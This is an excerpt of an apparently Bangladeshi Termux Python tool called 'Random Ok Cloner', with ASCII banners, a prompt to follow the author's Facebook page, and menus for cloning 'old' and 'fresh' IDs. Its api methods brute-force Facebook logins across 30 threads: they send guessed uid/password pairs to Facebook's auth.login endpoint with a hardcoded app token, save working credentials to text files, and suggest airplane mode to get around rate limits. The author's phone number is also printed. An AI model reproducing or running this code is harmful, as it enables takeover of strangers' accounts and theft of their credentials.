...
\033[0;99m========================\033[0;93mTAKE LOVE\033[0;99m===============================
\033[0;92m
 ████████  ▄▄▄        ██  ██   ██   █████    ██   ██   ██   
 ▓  ██  ▓  ████▄      ██  ██   ██   ██   █▌  ██   ██   ██    
    ██     ██  ▀█▄    ██▀▀██   ██   ██   █▌  ██   ██   ██    
    ...
    ██     ██    ██   ██  ██   ██   █████    ▒█████▒   ██████
                                                                                                                 ...
                                                                                                                 \033[0;106mversion 0.1 \033[0;99m                                        
\033[0;=========================\033[0;93mIt's Brand\033[0;99m==============================                                                                                                                              
          \033[0;95m╔═══════════════════════════════════════════╗
          \033[0;95m║  \033[0;94m [!]\033[0;90mTOOL OWER :\033[0;92m Tahidul khan             \033[0;95m║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mTOOL NAME :\033[0;92m Random Ok Cloner        \033[0;95m ║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mVERSION   :\033[0;92m 0.1                      \033[0;95m║
          \033[0;95m║ \033[0;94m  [!]\033[0;90mWHATS APP :\033[0;92m +8801403380158          \033[0;95m ║
          \033[0;95m╚═══════════════════════════════════════════╝ \033[0;00m""")
...
class Main:
	def __init__(self):
		...
		print("")
		print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
		print("\033[1;37m𝗡𝗢𝗧𝗘 : 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹  𝗙𝗼𝗹𝗹𝗼𝘄 𝗧𝗛𝗜𝗦 𝙋𝘼𝙂𝙀 ❦ ")
		print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
		
		
		print("")
		print("\033[1;37m [1] 𝗙𝗶𝗿𝘀𝘁 𝗙𝗢𝗟𝗟𝗢𝗪 𝗠𝗬 𝙋𝘼𝙂𝙀 ❦  ")
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/Termuxlover111")
			print("")
			time.sleep(3.0)
			print("\033[1;37m                    𝗖𝗛𝗘𝗖𝗞𝗜 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
			print("")
			input("\n\033[1;37m     𝗧𝗬𝗣𝗘  𝗡𝗔𝗠𝗘 ⇢    \033[1;37m")
			time.sleep(3.1)
			print("")
			print("\033[1;32m   𝐄𝐍𝐉𝐎𝐘 𝐓𝐇𝐈𝐒 𝐓𝐎𝐎𝐋𝐒 𓃵  ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print("\033[1;37m ============================================================== ")
	
		print(" \033[1;37m[1] :::::::::➤ 𝗢𝗟𝗗 𝗜𝗗 𝗖𝗟𝗢𝗡𝗘 𝟮𝟬𝟬𝟵 ☢  ")
		print(" \033[1;37m[2] :::::::::➤ 𝗙𝗥𝗔𝗦𝗛 𝗜𝗗 𝗖𝗟𝗢𝗡𝗘 𖦹 ")
		print("\033[1;37m [E] :::::::::➤ᴇӼɪᴛ ❛❜\n")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n\033[1;37m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
				...
				os.system("clear")
				print(logo)
				print("     \033[0;97m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
				print("\n\033[0;97m [+] 𝗕𝗿𝘂𝘁𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 🙂👈")
				print(" \033[0;97m[+] 𝗡𝗼𝘁𝗲 : 70% 𝗖𝗣 𝗮𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗼𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;37m[𝙆𝙃𝘼𝙉-𝘿𝙊𝙉𝙀]%s | %s\033[1;37m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("𝙆𝙃𝘼𝙉-𝘿𝙊𝙉𝙀.txt","a").write(" %s|%s\n"%(uid, pw))
				break
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("     \033[0;97m   🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎")
				print("\n\033[0;97m [+] 𝗕𝗿𝘂𝘁𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗦𝘁𝗮𝗿𝘁𝗲𝗱")
				print(" \033[0;97m[+] 𝗡𝗼𝘁𝗲 : 70% 𝗖𝗣 𝗔𝗰𝗰𝗼𝘂𝗻𝘁𝘀 𝗢𝗽𝗲𝗻 𝗝𝗨𝗦𝗧 𝗡𝗢𝗪")
				print(" [!] 𝗜𝗙 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 𝗨𝗦𝗘 𝗔𝗜𝗥𝗢𝗣𝗟𝗔𝗡𝗘 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 10 𝗦𝗘𝗖𝗦")
				print("\033[0;97m--------------------------------------------")
				print("\n")
				print("\033[1;37m")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;37m[𝙆𝙃𝘼𝙉-𝘿𝙊𝙉𝙀] %s | %s\033[0;37m         "%(uid, pw))
				print ("\r \033[1;37m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("ASIF-SUCCESSFULL.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;32m[𝙆𝙃𝘼𝙉-𝘿𝙊𝙉𝙀] %s | %s\033[1;37m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("𝙆𝙃𝘼𝙉.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue
